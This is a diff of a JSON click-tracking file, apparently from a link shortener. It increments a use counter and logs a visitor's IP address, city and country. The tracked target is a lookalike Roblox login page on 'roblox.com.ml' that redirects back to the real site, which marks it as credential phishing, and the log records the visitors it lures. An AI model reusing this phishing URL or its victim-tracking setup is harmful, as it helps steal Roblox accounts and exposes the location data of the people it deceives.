@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 56,
+    "useCount": 57,
     "createdBy": "admin",
     "clicks": [
       {
@@ -555,6 +555,14 @@
       },
       {
         "timestamp": 1776875215467,
+        "ip": "128.127.120.119",
+        "country": "Romania",
+        "city": "Bucharest",
+        "flag": "🇷🇴",
+        "countryCode": "RO"
+      },
+      {
+        "timestamp": 1776875992529,
         "ip": "128.127.120.119",
         "country": "Romania",
         "city": "Bucharest",
